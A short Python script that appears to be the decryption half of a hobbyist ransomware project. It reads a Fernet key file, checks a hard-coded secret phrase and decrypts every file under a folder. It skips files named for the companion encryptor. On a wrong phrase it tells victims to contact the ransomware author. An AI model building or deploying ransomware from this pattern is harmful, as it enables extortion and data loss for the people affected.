#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

def decrypt_files(folder_path, secret_phrase):
    try:
        with open(os.path.join(folder_path, "thekey.key"), "rb") as key_file:
            secretkey = key_file.read()

        user_phrase = input("Enter the secret phrase to decrypt your files:\n")

        if user_phrase == secret_phrase:
            for root, _, files in os.walk(folder_path):
                for file in files:
                    if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
                        continue
                    file_path = os.path.join(root, file)
                    with open(file_path, "rb") as thefile:
                        contents = thefile.read()
                    contents_decrypted = Fernet(secretkey).decrypt(contents)
                    with open(file_path, "wb") as thefile:
                        thefile.write(contents_decrypted)
            print("Congratulations! Your files have been decrypted.")
        else:
            print("Sorry, wrong phrase. Contact the ransomware author for further instructions.")

    except FileNotFoundError:
        print("Error: 'thekey.key' file not found in the specified folder.")

# Start decryption from the current directory
secret_phrase = "coffee"  # Replace with your actual secret phrase
decrypt_files(".", secret_phrase)
